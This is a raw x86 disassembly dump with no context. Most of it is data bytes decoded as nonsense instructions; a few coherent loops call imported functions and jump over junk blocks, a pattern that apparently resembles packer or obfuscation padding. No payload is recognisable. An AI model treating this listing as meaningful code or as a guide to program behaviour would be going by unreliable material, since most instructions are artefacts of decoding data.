  418ff8:	jae    0x418f80
  418ffa:	in     eax,dx
  418ffb:	mov    ebx,DWORD PTR [edx-0x73]
  418ffe:	fnstsw WORD PTR ds:[esi+ebp*8]
  419002:	bound  eax,QWORD PTR [eax]
  419004:	jmp    0x232:0x7fd59e3e
  41900b:	jnp    0x418f8e
  41900d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41900e:	shl    dh,0xf9
  419011:	(bad)  
  419012:	jmp    FWORD PTR [esi]
  419014:	or     eax,0xe89f8735
  419019:	in     al,0x5c
  41901b:	outs   dx,DWORD PTR ds:[esi]
  41901c:	test   eax,0xfad365a8
  419021:	lahf   
  419022:	in     al,dx
  419023:	mov    al,0xf7
  419025:	inc    edi
  419026:	sub    eax,0xc58d161b
  41902b:	cmp    DWORD PTR [esi+0x21],ebx
  41902e:	hlt    
  41902f:	push   es
  419030:	mov    ebx,0xae749015
  419035:	retf   0x3f33
  419038:	out    dx,al
  419039:	jge    0x419065
  41903b:	scas   eax,DWORD PTR es:[edi]
  41903c:	cld    
  41903d:	test   al,0x45
  41903f:	ret    
  419040:	sbb    ebp,DWORD PTR [eax+0x7c]
  419043:	daa    
  419044:	cmp    eax,DWORD PTR ds:0x96c28a75
  41904a:	sbb    cl,BYTE PTR [ebx+0x60]
  41904d:	call   0xba56:0x76f96920
  419054:	inc    ebx
  419055:	jmp    0x1418:0xaf929d4f
  41905c:	push   edi
  41905d:	inc    esi
  41905e:	and    BYTE PTR [eax+0x14],0xf3
  419062:	dec    edi
  419063:	dec    ebx
  419064:	mov    esi,0x9dfb52cd
  419069:	mov    dl,0x15
  41906b:	fimul  DWORD PTR [ecx+0x10]
  41906e:	loopne 0x41901d
  419070:	je     0x419034
  419072:	(bad)  
  419073:	sbb    BYTE PTR [ebp-0x1d44bf96],bl
  419079:	(bad)  
  41907a:	adc    al,0x93
  41907c:	repnz arpl WORD PTR ds:0x5b8b9687,di
  419083:	xchg   esp,eax
  419084:	in     eax,0xe0
  419086:	xchg   esp,eax
  419087:	mov    es,WORD PTR [edx-0x73]
  41908a:	xchg   ebp,eax
  41908b:	or     dl,BYTE PTR [edx-0x3]
  41908e:	clc    
  41908f:	jl     0x419087
  419091:	(bad)  
  419092:	scas   eax,DWORD PTR es:[edi]
  419093:	pusha  
  419094:	push   ecx
  419095:	and    eax,DWORD PTR [edi+eax*2+0x33]
  419099:	xor    DWORD PTR [ebp+0x3b],edx
  41909c:	imul   ebx,DWORD PTR [esi+0x40],0x225974a5
  4190a3:	(bad)  
  4190a4:	retf   
  4190a5:	pop    ds
  4190a6:	nop
  4190a7:	popa   
  4190a8:	jmp    0xf3a5d660
  4190ad:	xor    al,0x9f
  4190af:	jae    0x4190d6
  4190b1:	sbb    BYTE PTR [edi-0x30],dh
  4190b4:	or     al,0x5e
  4190b6:	or     dl,BYTE PTR [edx]
  4190b8:	sub    eax,0xc84e3db0
  4190bd:	mov    eax,0x23a41139
  4190c2:	(bad)  
  4190c4:	adc    ah,BYTE PTR [edx+esi*1-0x634debd9]
  4190cb:	cmp    ah,ah
  4190cd:	jne    0x419104
  4190cf:	inc    ebp
  4190d0:	add    edi,esp
  4190d2:	sbb    DWORD PTR [ebx-0x74981e8f],ecx
  4190d8:	enter  0x48ee,0x96
  4190dc:	loopne 0x419073
  4190de:	loope  0x4190f9
  4190e0:	jle    0x419152
  4190e2:	or     al,0xf0
  4190e4:	mov    esp,DWORD PTR [ecx-0x2e]
  4190e7:	mov    ah,0xcc
  4190e9:	cmp    al,0xad
  4190eb:	or     bl,BYTE PTR [ebp+0xaf72004]
  4190f1:	add    al,0x94
  4190f3:	cli    
  4190f4:	dec    eax
  4190f5:	xor    edx,DWORD PTR fs:[ebp+ecx*8+0x7b]
  4190fa:	inc    esi
  4190fb:	int3   
  4190fc:	repnz mov ecx,0x4f579d92
  419102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419103:	(bad)  
  419105:	les    ebx,FWORD PTR [esi-0x1a]
  419108:	xor    DWORD PTR [edx],0xe3a453a1
  41910e:	jb     0x419103
  419110:	gs call 0xc4f300fb
  419116:	hlt    
  419117:	mov    WORD PTR [eax+0x11],fs
  41911a:	xchg   ebp,eax
  41911b:	aaa    
  41911c:	je     0x41917f
  41911e:	ret    
  41911f:	and    DWORD PTR [eax],ebp
  419121:	repz data16 fimul WORD PTR [ecx+0x2acbe084]
  41912a:	mov    BYTE PTR [edi+esi*1-0x67d6e13f],ch
  419131:	dec    ebp
  419132:	jl     0x419109
  419134:	sti    
  419135:	xchg   esp,eax
  419136:	jle    0x4190dc
  419138:	push   ebx
  41913a:	fldenv gs:[ebx-0x582f814]
  419141:	jne    0x4190f2
  419143:	jnp    0x419111
  419145:	pop    edi
  419146:	adc    eax,0xd8c5d536
  41914b:	aaa    
  41914c:	mov    esp,edx
  41914e:	fcomp  DWORD PTR [esi-0x61505a33]
  419154:	out    dx,al
  419155:	push   eax
  419156:	repz fild WORD PTR [esi]
  419159:	sub    bh,0x30
  41915c:	sbb    eax,ebp
  41915e:	pushf  
  41915f:	sbb    BYTE PTR ds:0xb3479ba3,ah
  419165:	enter  0x2a8c,0x77
  419169:	loope  0x41918d
  41916b:	mov    esi,edi
  41916d:	ja     0x419172
  41916f:	dec    edx
  419170:	and    eax,0xf666dd04
  419175:	or     al,0x33
  419177:	inc    edi
  419178:	lds    ecx,FWORD PTR [esi+esi*2+0x7e]
  41917c:	test   eax,0xbb31e9aa
  419181:	ss mov dl,0xaf
  419184:	cli    
  419185:	and    esp,DWORD PTR ds:0xff7d7ea1
  41918b:	shr    cl,1
  41918d:	add    eax,DWORD PTR [eax]
  41918f:	add    BYTE PTR [eax],al
  419191:	mov    eax,DWORD PTR [ebp+0x10]
  419194:	leave  
  419195:	ret    0xc
  419198:	push   ebp
  419199:	mov    ebp,esp
  41919b:	sub    esp,0x30
  41919e:	jmp    0x4193d3
  4191a3:	rcl    edx,cl
  4191a5:	ret    0xc13e
  4191a8:	into   
  4191a9:	rcl    ecx,cl
  4191ab:	daa    
  4191ac:	jle    0x419228
  4191ae:	mov    gs,WORD PTR [edi]
  4191b0:	ins    DWORD PTR es:[edi],dx
  4191b1:	xchg   esp,eax
  4191b2:	cmp    eax,0x787fc508
  4191b7:	adc    BYTE PTR [esi+0x78],bh
  4191ba:	js     0x419182
  4191bc:	pop    esp
  4191bd:	push   edx
  4191be:	mov    gs,WORD PTR fs:[ecx]
  4191c1:	xor    edx,esp
  4191c3:	leave  
  4191c4:	fucom  st(5)
  4191c6:	fstp   st(2)
  4191c8:	loope  0x419165
  4191ca:	and    BYTE PTR [edi+0x29],cl
  4191cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191ce:	inc    edi
  4191cf:	xchg   esp,eax
  4191d0:	rcl    DWORD PTR [edx],cl
  4191d2:	mov    eax,ds:0xdd485eb3
  4191d7:	hlt    
  4191d8:	jmp    0x1a77:0x27796d49
  4191df:	lds    edx,FWORD PTR ds:0xe2c1efd9
  4191e5:	ins    DWORD PTR es:[edi],dx
  4191e6:	mov    ch,0x8c
  4191e8:	adc    DWORD PTR [edx],edi
  4191ea:	push   ss
  4191eb:	outs   dx,DWORD PTR ds:[esi]
  4191ec:	mov    dh,0x7
  4191ee:	push   esp
  4191ef:	jle    0x419171
  4191f1:	out    dx,eax
  4191f2:	mov    al,ds:0x599cf1e9
  4191f7:	hlt    
  4191f8:	leave  
  4191f9:	cmp    DWORD PTR [ebp+0x7c],esi
  4191fc:	xchg   edi,eax
  4191fd:	das    
  4191fe:	lods   eax,DWORD PTR ds:[esi]
  4191ff:	fidiv  WORD PTR [ecx+0x1a925d4b]
  419205:	das    
  419206:	mov    eax,ds:0xc3004aa2
  41920b:	mov    dh,0x2d
  41920d:	mov    ebp,0x81a16318
  419212:	les    esi,FWORD PTR [ebp-0x18]
  419215:	and    eax,0x923e1c17
  41921a:	dec    ebx
  41921b:	sub    edi,DWORD PTR [esi+0x2]
  41921e:	xchg   ebp,eax
  41921f:	aam    0x8
  419221:	xchg   esp,eax
  419222:	adc    BYTE PTR [ebx+0x1491bda1],bl
  419228:	mov    DWORD PTR [edx-0x22],ebx
  41922b:	push   ecx
  41922c:	fcmovnb st,st(7)
  41922e:	test   BYTE PTR [ebp-0x64],0xf
  419232:	xor    al,0xae
  419234:	mov    al,0xb
  419236:	pop    ecx
  419237:	jp     0x41922c
  419239:	fisub  WORD PTR [ebx+0x3cbdbce5]
  41923f:	fldcw  WORD PTR [ebx]
  419241:	loopne 0x4192a1
  419243:	fwait
  419244:	lea    ecx,[ebp+edi*2-0x41]
  419248:	xchg   ebx,ecx
  41924a:	enter  0xb7a0,0x1c
  41924e:	add    al,0x91
  419250:	mov    cl,0xff
  419252:	aam    0xb9
  419254:	cmp    DWORD PTR [edi+edx*4+0x4b],ecx
  419258:	xchg   DWORD PTR [eax+0x4b],ebp
  41925b:	test   BYTE PTR [ecx],0x53
  41925e:	repnz inc edx
  419260:	loope  0x419206
  419262:	dec    edi
  419263:	sub    ch,bl
  419265:	jge    0x419234
  419267:	int    0x79
  419269:	not    DWORD PTR [edx+0x30]
  41926c:	icebp  
  41926d:	push   esp
  41926e:	mov    ds:0x8bd2e7b5,eax
  419273:	nop
  419274:	xor    al,0x9e
  419276:	pop    es
  419277:	out    0x4a,al
  419279:	ins    DWORD PTR es:[edi],dx
  41927a:	nop
  41927b:	nop
  41927c:	jae    0x41929b
  41927e:	in     eax,dx
  41927f:	in     eax,dx
  419280:	stos   BYTE PTR es:[edi],al
  419281:	jecxz  0x4192c5
  419283:	int3   
  419284:	shl    DWORD PTR [eax],0x6e
  419287:	daa    
  419288:	adc    dh,al
  41928a:	(bad)  
  41928b:	xchg   edx,eax
  41928c:	sahf   
  41928d:	adc    eax,0x54187724
  419292:	test   DWORD PTR [ebx+0x259f6247],edi
  419298:	shl    al,1
  41929a:	add    al,BYTE PTR ds:0x209b7ac8
  4192a0:	mov    bh,BYTE PTR [edi-0x7d]
  4192a3:	cmp    eax,0x50615e47
  4192a8:	add    DWORD PTR [ecx-0x45f8f487],ebp
  4192ae:	std    
  4192af:	test   BYTE PTR [edi-0xfa2a224],cl
  4192b5:	popf   
  4192b6:	pop    ebp
  4192b7:	mov    dh,0xf2
  4192b9:	cmp    eax,0xe2c090dc
  4192be:	daa    
  4192bf:	mov    bl,0xe9
  4192c1:	pop    esi
  4192c2:	cwde   
  4192c3:	mov    eax,0x8265db7e
  4192c8:	adc    eax,0x85415e96
  4192cd:	in     al,dx
  4192ce:	imul   esi,DWORD PTR [eax-0x6a],0x9da46f60
  4192d5:	pop    ebx
  4192d6:	or     dh,BYTE PTR [edi+0x4ba91d87]
  4192dc:	push   edx
  4192dd:	cmc    
  4192de:	pop    ds
  4192df:	sbb    dl,BYTE PTR ds:0xd42e58c5
  4192e5:	mov    eax,ds:0xf34a7c6a
  4192ea:	or     al,0x7c
  4192ec:	test   BYTE PTR [ecx],ch
  4192ee:	das    
  4192ef:	inc    esp
  4192f0:	xor    dl,BYTE PTR [ebp+edi*2+0x5e266fd7]
  4192f7:	sub    DWORD PTR [ecx-0x11e7e35d],0xffffffdf
  4192fe:	xchg   edi,eax
  4192ff:	ror    DWORD PTR [ebx-0x59],1
  419302:	rol    DWORD PTR [ebx-0x10],0x9a
  419306:	sbb    BYTE PTR [edi+0x60af068d],cl
  41930c:	push   0xffffffba
  41930e:	cld    
  41930f:	rcl    DWORD PTR [esi+0x5aeda0b9],1
  419315:	jl     0x419350
  419317:	fnstsw WORD PTR [ecx+edx*8+0x50]
  41931b:	das    
  41931c:	stos   BYTE PTR es:[edi],al
  41931d:	push   ecx
  41931e:	inc    esp
  41931f:	outs   dx,DWORD PTR ds:[esi]
  419320:	retf   
  419321:	fidiv  DWORD PTR [esi-0x1581fed6]
  419327:	dec    esp
  419328:	jno    0x419369
  41932a:	push   edi
  41932b:	mov    eax,0xc06b895b
  419330:	ins    BYTE PTR es:[edi],dx
  419331:	popa   
  419332:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419333:	(bad)  
  419335:	cs clc 
  419337:	loop   0x419359
  419339:	nop
  41933a:	push   ds
  41933b:	pop    ebx
  41933c:	mov    esi,0xbef6b58b
  419341:	fxch   st(6)
  419343:	lahf   
  419344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419345:	sbb    ch,BYTE PTR [eax+0x3c]
  419348:	push   esi
  419349:	xor    eax,0xa240e851
  41934e:	dec    ebp
  41934f:	fs xor eax,0xb9b8dc37
  419355:	nop
  419356:	gs xchg ebx,eax
  419358:	sub    edx,DWORD PTR [esi]
  41935a:	jbe    0x419309
  41935c:	sbb    BYTE PTR [ebx-0x53ae2030],bh
  419362:	loope  0x419388
  419364:	xor    eax,0x596dbc95
  419369:	fdivr  QWORD PTR [ebp-0x4c]
  41936c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41936d:	mov    bh,BYTE PTR [eax+0x47c14ce8]
  419373:	std    
  419374:	out    dx,al
  419375:	cld    
  419376:	pop    ebx
  419377:	sbb    al,BYTE PTR [ebp+ecx*8-0x7]
  41937b:	in     al,0x2c
  41937d:	dec    ecx
  41937e:	lock test DWORD PTR [ecx+0x23a9913d],eax
  419385:	add    eax,0x1777bcb5
  41938a:	mov    al,ds:0x9947fa98
  41938f:	stos   DWORD PTR es:[edi],eax
  419390:	ret    0x76fb
  419393:	inc    ebx
  419394:	sbb    esi,DWORD PTR [ebx-0x2f]
  419397:	jae    0x41939a
  419399:	repnz cmp eax,0x302e1ba4
  41939f:	cmp    DWORD PTR [eax+0x83cdd5e],ebp
  4193a5:	out    dx,eax
  4193a6:	push   ebx
  4193a7:	xchg   esp,eax
  4193a8:	les    edx,FWORD PTR [ecx+edx*8+0x20]
  4193ac:	mov    ds:0x8aaa11f5,eax
  4193b1:	jnp    0x4193c6
  4193b3:	mov    al,0x86
  4193b5:	jns    0x419396
  4193b7:	das    
  4193b8:	je     0x4193e5
  4193ba:	mov    al,0xcf
  4193bc:	aam    0x19
  4193be:	aam    0xfb
  4193c0:	jbe    0x41941c
  4193c2:	mov    ds:0x507465d0,al
  4193c7:	mov    WORD PTR [ebx],ss
  4193c9:	adc    al,0xaf
  4193cb:	lock or DWORD PTR [edx+0x37c8acd3],eax
  4193d2:	rol    edi,1
  4193d4:	inc    ebp
  4193d5:	cld    
  4193d6:	cmp    BYTE PTR [ebp+0x2581f89c],al
  4193dc:	jge    0x419386
  4193de:	inc    edx
  4193df:	add    BYTE PTR [eax],al
  4193e1:	add    BYTE PTR [eax],al
  4193e3:	add    BYTE PTR [ebx],dh
  4193e5:	leave  
  4193e6:	add    ecx,DWORD PTR ds:0x42a87d
  4193ec:	inc    ecx
  4193ed:	mov    DWORD PTR ds:0x42a87d,ecx
  4193f3:	cmp    DWORD PTR ds:0x42a87d,0x24
  4193fa:	jne    0x41940b
  419400:	push   0x4f45
  419405:	call   DWORD PTR ds:0x41d278
  41940b:	cmp    DWORD PTR ds:0x42a87d,0x1b
  419412:	jb     0x4193e4
  419418:	and    DWORD PTR ds:0x42a801,0x0
  419422:	jmp    0x419434
  419427:	mov    ecx,DWORD PTR ds:0x42a801
  41942d:	inc    ecx
  41942e:	mov    DWORD PTR ds:0x42a801,ecx
  419434:	cmp    DWORD PTR ds:0x42a801,0x1d
  41943b:	jae    0x419470
  419441:	cmp    DWORD PTR ds:0x42a801,0x1e
  419448:	jne    0x419461
  41944e:	push   0x42a98f
  419453:	push   DWORD PTR [ebp-0x20]
  419456:	push   0x1
  419458:	push   DWORD PTR [ebp-0xc]
  41945b:	call   DWORD PTR ds:0x41d118
  419461:	jmp    0x419427
  419466:	adc    DWORD PTR ds:0x42a7b1,0x7c2
  419470:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  419477:	and    DWORD PTR ds:0x42a80d,0x0
  419481:	mov    ecx,DWORD PTR ds:0x42a80d
  419487:	inc    ecx
  419488:	mov    DWORD PTR ds:0x42a80d,ecx
  41948e:	cmp    DWORD PTR ds:0x42a80d,0x25
  419495:	jne    0x4194a6
  41949b:	push   0x42aa48
  4194a0:	call   DWORD PTR ds:0x41d27c
  4194a6:	cmp    DWORD PTR ds:0x42a80d,0x18
  4194ad:	jb     0x419481
  4194b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4194b6:	mov    eax,ds:0x42a805
  4194bb:	and    DWORD PTR ds:0x42a775,eax
  4194c1:	push   ebx
  4194c2:	add    ebx,ebx
  4194c4:	mov    eax,0x7510850
  4194c9:	and    DWORD PTR ds:0x42a76d,ecx
  4194cf:	xor    ecx,eax
  4194d1:	movzx  ebx,BYTE PTR ds:0x42a779
  4194d8:	adc    DWORD PTR ds:0x42a871,ebx
  4194de:	mov    ebx,0x327298
  4194e3:	adc    DWORD PTR ds:0x42a761,0x50ad
  4194ed:	add    ecx,ebx
  4194ef:	inc    DWORD PTR ds:0x42a87d
  4194f5:	mov    DWORD PTR [ebp-0x1c],ecx
  4194f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4194fb:	push   esi
  4194fc:	mov    DWORD PTR ds:0x42a7f5,0x238f
  419506:	push   edi
  419507:	test   ecx,ecx
  419509:	mov    DWORD PTR ds:0x42a839,0x1f7e
  419513:	je     0x419758
  419519:	jmp    0x41974e
  41951e:	retf   0xd03c
  419521:	(bad)
  419524:	fld    st(3)
  419526:	scas   eax,DWORD PTR es:[edi]
  419527:	inc    eax
  419528:	adc    DWORD PTR [esi-0x6f],eax
  41952b:	call   0x787f:0xcb20e149
  419532:	adc    BYTE PTR [esi+0x78],bh
  419535:	js     0x4195b2
  419537:	pop    edx
  419538:	fadd   st,st(1)
  41953a:	fwait
  41953b:	jmp    0x4194e2
  41953d:	pop    eax
  41953e:	gs jecxz 0x41958c
  419541:	jne    0x4194df
  419543:	mov    al,ds:0x84efd05
  419548:	rcr    DWORD PTR [edx-0x44cf5cf1],0x14
  41954f:	push   0xffffff87
  419551:	test   eax,0x4a2d12e
  419556:	add    bl,BYTE PTR [edx-0x6b]
  419559:	stc    
  41955a:	pop    esi
  41955b:	or     DWORD PTR [edx],ecx
  41955d:	rol    BYTE PTR ds:[edi+0x479e6a5a],0x7c
  419565:	outs   dx,DWORD PTR ds:[esi]
  419566:	mov    bh,0x72
  419568:	sbb    DWORD PTR [edi*1-0x2c825226],edx
  41956f:	aas    
  419570:	sbb    DWORD PTR [eax],esp
  419572:	xchg   edx,eax
  419573:	sti    
  419574:	inc    edi
  419575:	dec    edi
  419576:	leave  
  419577:	shr    BYTE PTR [ebx-0x73],cl
  41957a:	ret    0xab0f
  41957d:	cdq    
  41957e:	dec    edi
  41957f:	pop    ebp
  419580:	push   cs
  419581:	fsubr  QWORD PTR [eax]
  419583:	jae    0x4195c7
  419585:	cdq    
  419586:	and    al,0x57
  419588:	adc    eax,ebx
  41958a:	mov    bh,0x94
  41958c:	or     BYTE PTR [ecx-0x785a322c],dl
  419592:	cmp    DWORD PTR cs:[esi-0x39],esp
  419596:	jl     0x419599
  419598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419599:	daa    
  41959a:	(bad)  
  41959b:	push   esp
  41959c:	sub    dl,0x1a
  41959f:	shr    DWORD PTR [esp+ecx*8],0x38
  4195a3:	xlat   BYTE PTR ds:[ebx]
  4195a4:	fs push edi
  4195a6:	stc    
  4195a7:	add    edx,edi
  4195a9:	popa   
  4195aa:	sub    BYTE PTR [ebx],al
  4195ac:	mov    al,ch
  4195ae:	shl    BYTE PTR [ecx+eiz*1+0x63],0xb1
  4195b3:	loope  0x419561
  4195b5:	pop    ss
  4195b6:	xchg   esi,eax
  4195b7:	sub    ecx,DWORD PTR [eax-0x3ffdf59]
  4195bd:	cmp    edx,DWORD PTR [edi-0x5d]
  4195c0:	pop    eax
  4195c1:	cmp    DWORD PTR [ecx],ebx
  4195c3:	mov    edi,0xbbb7516d
  4195c8:	xchg   esi,eax
  4195c9:	mov    esp,0x1e109bb6
  4195ce:	jg     0x41956b
  4195d0:	popf   
  4195d1:	aad    0xa6
  4195d3:	push   ecx
  4195d4:	lods   al,BYTE PTR ds:[esi]
  4195d5:	xchg   edi,eax
  4195d6:	sub    dh,al
  4195d8:	cmp    bl,BYTE PTR [esi]
  4195da:	cmp    esp,ebx
  4195dc:	iret   
  4195dd:	out    dx,al
  4195de:	jns    0x41957e
  4195e0:	jb     0x41957b
  4195e2:	add    BYTE PTR [ebx-0x7e055bd8],0x46
  4195e9:	add    BYTE PTR [esi+0x5b1a2937],ch
  4195ef:	xchg   ecx,eax
  4195f0:	ja     0x4195c1
  4195f2:	cmp    eax,0x8675eccc
  4195f7:	call   0xd9da676d
  4195fc:	popf   
  4195fd:	adc    ah,BYTE PTR [esi+0x7a356cc1]
  419603:	pop    ds
  419604:	jmp    0x41967a
  419606:	jge    0x419665
  419608:	mov    ebx,0x9404329b
  41960d:	push   edi
  41960e:	jbe    0x419661
  419610:	jmp    0x2ffc0d1d
  419615:	loop   0x419638
  419617:	dec    BYTE PTR [esi+0x21a1d727]
  41961d:	test   eax,0xdef260d9
  419622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419623:	adc    eax,0xfce8c2bc
  419628:	mov    cl,0x9a
  41962a:	inc    esi
  41962b:	xor    BYTE PTR [eax+0x16edcaa4],ah
  419631:	inc    eax
  419632:	stos   DWORD PTR es:[edi],eax
  419633:	stos   DWORD PTR es:[edi],eax
  419634:	ficomp WORD PTR [eax-0x23]
  419637:	mov    edx,0x73853e88
  41963c:	das    
  41963d:	mov    bh,0xeb
  41963f:	sbb    esi,esp
  419641:	mov    eax,0x4dcf269
  419646:	fs loope 0x4195ce
  419649:	iret   
  41964a:	cmp    al,0x75
  41964c:	sub    BYTE PTR [ecx+0x4d],0x8c
  419650:	loop   0x41965b
  419652:	jge    0x41968a
  419654:	sbb    BYTE PTR [edx-0x78c4b3e9],ah
  41965a:	pop    ss
  41965b:	shl    DWORD PTR ds:0x6b3e0d04,cl
  419661:	iret   
  419662:	mov    ds:0xcac98132,al
  419667:	jae    0x419661
  419669:	clc    
  41966a:	test   BYTE PTR [ecx-0x62],0x75
  41966e:	aad    0x39
  419670:	not    BYTE PTR [esi+0x29]
  419673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419674:	(bad)  
  419675:	sbb    al,0xf0
  419677:	stos   DWORD PTR es:[edi],eax
  419678:	out    0xab,eax
  41967a:	or     ah,bl
  41967c:	aas    
  41967d:	adc    DWORD PTR [edi+0x7d],edi
  419680:	repnz sub DWORD PTR [eax-0x4d],edx
  419684:	pop    ss
  419685:	(bad)  
  419688:	icebp  
  419689:	dec    esi
  41968a:	out    dx,al
  41968b:	imul   DWORD PTR [ebx-0x7ed55af]
  419691:	enter  0xd063,0x4e
  419695:	mov    cl,0xc6
  419697:	xchg   ebp,eax
  419698:	pop    esi
  419699:	dec    ebx
  41969a:	or     dl,cl
  41969c:	imul   esp,DWORD PTR [eax+0x25],0x69
  4196a0:	mov    cl,ah
  4196a2:	sub    DWORD PTR [eax-0x62e0e6bb],esi
  4196a8:	ja     0x41962b
  4196aa:	lods   eax,DWORD PTR ds:[esi]
  4196ab:	sti    
  4196ac:	fnsave [edx]
  4196ae:	and    BYTE PTR gs:[ebx-0x31],0x38
  4196b3:	mov    al,ds:0x4fad41a7
  4196b8:	add    DWORD PTR [ecx+edi*8],eax
  4196bb:	inc    eax
  4196bc:	add    dl,BYTE PTR [eax+ebp*8-0x27]
  4196c0:	jmp    0xdcbe:0xe6e3ab53
  4196c7:	fst    DWORD PTR ds:0xa650d200
  4196cd:	pop    ds
  4196ce:	mov    ds:0x5921e225,al
  4196d3:	les    edi,FWORD PTR [eax-0x3b3c86fe]
  4196d9:	fiadd  WORD PTR [ebx-0x1db0336]
  4196df:	jle    0x4196d0
  4196e1:	jecxz  0x419755
  4196e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196e4:	adc    BYTE PTR [ebp+0x104d03d7],ah
  4196ea:	cmp    eax,0x5e447afd
  4196ef:	cmp    al,0xb9
  4196f1:	jecxz  0x419696
  4196f3:	out    0xfc,al
  4196f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196f6:	pusha  
  4196f7:	mov    cl,0x33
  4196f9:	pop    es
  4196fa:	mov    esi,0x91ba4bc0
  4196ff:	fmul   DWORD PTR [esi+0x318650af]
  419705:	or     esi,esp
  419707:	enter  0x9ef8,0x37
  41970b:	aad    0x99
  41970d:	jl     0x419752
  41970f:	shl    BYTE PTR [edi+ebx*1],cl
  419712:	div    edi
  419714:	pop    es
  419715:	sub    BYTE PTR [ebp-0x132575ca],0xa9
  41971c:	ja     0x41974f
  41971e:	lea    edi,[edi-0x4800cf38]
  419724:	jp     0x419709
  419726:	push   edx
  419727:	push   ecx
  419728:	push   ebp
  419729:	leave  
  41972a:	push   cs
  41972b:	loope  0x4196b3
  41972d:	mov    BYTE PTR [edi],dh
  41972f:	inc    ebp
  419730:	sub    BYTE PTR [edi+0x59509d3],ah
  419736:	add    eax,DWORD PTR ds:0xb7f1f4e0
  41973c:	sub    al,0x6f
  41973e:	adc    dl,ch
  419740:	mov    edx,0xbcfcdbd8
  419745:	sbb    ebp,DWORD PTR [ecx+0x46]
  419748:	sbb    BYTE PTR [ecx-0x78406843],dh
  41974e:	mov    ecx,DWORD PTR [ebp+0x14]
  419751:	add    esi,esi
  419753:	mov    ecx,DWORD PTR [ecx]
  419755:	mov    DWORD PTR [ebp-0x1c],ecx
  419758:	imul   edx,eax
  41975b:	xor    edi,DWORD PTR ds:0x42a801
  419761:	mov    ecx,0x4573
  419766:	add    edx,ecx
  419768:	sub    DWORD PTR ds:0x42a87d,ecx
  41976e:	mov    esi,0x7879
  419773:	mov    edi,0x1556
  419778:	not    DWORD PTR ds:0x42a845
  41977e:	xchg   esi,ecx
  419780:	add    DWORD PTR ds:0x42a7b5,0x585c
  41978a:	jmp    0x4199bf
  41978f:	iret   
  419790:	iret   
  419791:	(bad)  
  419792:	xlat   BYTE PTR ds:[ebx]
  419793:	(bad)  
  419794:	xlat   BYTE PTR ds:[ebx]
  419795:	iret   
  419796:	xlat   BYTE PTR ds:[ebx]
  419797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419798:	call   0xa584ddeb
  41979d:	lods   al,BYTE PTR ds:[esi]
  41979e:	leave  
  41979f:	cmp    cl,cl
  4197a1:	jg     0x41981b
  4197a3:	adc    BYTE PTR [esi+0x78],bh
  4197a6:	js     0x419784
  4197a8:	adc    DWORD PTR [eax-0x41be3d14],ebp
  4197ae:	arpl   di,dx
  4197b0:	cmc    
  4197b1:	cmp    BYTE PTR [edi+0x534306f8],0x7f
  4197b8:	iret   
  4197b9:	retf   
  4197ba:	pop    ecx
  4197bb:	xor    dh,BYTE PTR [esi-0x6ce00d7d]
  4197c1:	out    0x7b,al
  4197c3:	imul   ebx,DWORD PTR [ebp-0x5e449a11],0x33
  4197ca:	mov    es,WORD PTR [ebx+edi*4+0x20]
  4197ce:	(bad)  
  4197cf:	mov    ds:0x109e4d31,al
  4197d4:	sub    ebx,esi
  4197d6:	pop    edi
  4197d7:	ss mov ch,0x4f
  4197da:	cmp    BYTE PTR [esi-0x2a02c99b],0x74
  4197e1:	jmp    0x4197cc
  4197e3:	ins    BYTE PTR es:[edi],dx
  4197e4:	stos   BYTE PTR es:[edi],al
  4197e5:	pop    esp
  4197e6:	xchg   esi,eax
  4197e7:	cmc    
  4197e8:	mov    edi,0x644acaf0
  4197ed:	loopne 0x41980d
  4197ef:	cmp    al,bl
  4197f1:	sar    DWORD PTR [edx+0x7b],cl
  4197f4:	lea    edx,[esi+esi*4-0x66]
  4197f8:	push   eax
  4197f9:	xor    al,0xf8
  4197fb:	loopne 0x419858
  4197fd:	cwde   
  4197fe:	sbb    eax,esp
  419800:	push   ebx
  419801:	shl    BYTE PTR [edi-0x79],1
  419804:	push   esi
  419805:	jns    0x419824
  419807:	jmp    0x62d197da
  41980c:	imul   edi,ebp,0x9ffe3be
  419812:	scas   al,BYTE PTR es:[edi]
  419813:	in     al,0xee
  419815:	push   ss
  419816:	scas   eax,DWORD PTR es:[edi]
  419817:	stos   DWORD PTR es:[edi],eax
  419818:	jmp    0x365e7967
  41981d:	in     al,dx
  41981e:	retf   0x4f2e
  419821:	bnd je 0x4197b7
  419824:	adc    BYTE PTR [ebp+0x19],0x74
  419828:	rcr    DWORD PTR [esi],0x76
  41982b:	fsub   st,st(1)
  41982d:	xchg   ebx,eax
  41982e:	aam    0x5
  419830:	addr16 mov al,ds:0x71ff
  419834:	in     al,0x14
  419836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419837:	adc    DWORD PTR [esi+0x348140fa],esp
  41983d:	inc    esp
  41983e:	out    dx,eax
  41983f:	xor    eax,0xc5b7fc5
  419844:	repnz ins BYTE PTR es:[edi],dx
  419846:	iret   
  419847:	xchg   esp,eax
  419848:	frstor [eax+eiz*4]
  41984b:	out    0x61,al
  41984d:	ss mov bl,0x86
  419850:	xchg   ecx,eax
  419851:	das    
  419852:	add    dh,BYTE PTR [edx+0x390f1033]
  419858:	das    
  419859:	dec    DWORD PTR [esi-0x1c]
  41985c:	push   esp
  41985d:	iret   
  41985e:	addr16 mov edx,edi
  419861:	or     ch,cl
  419863:	mov    ds:0x8ca73aa7,eax
  419868:	push   0xffffffe4
  41986a:	add    al,0xd6
  41986c:	mov    ah,BYTE PTR [ebp-0x37]
  41986f:	jb     0x41982e
  419871:	mov    eax,esi
  419873:	hlt    
  419874:	cmp    eax,DWORD PTR [esp+eax*8+0x1]
  419878:	ret    
  419879:	sbb    al,0x21
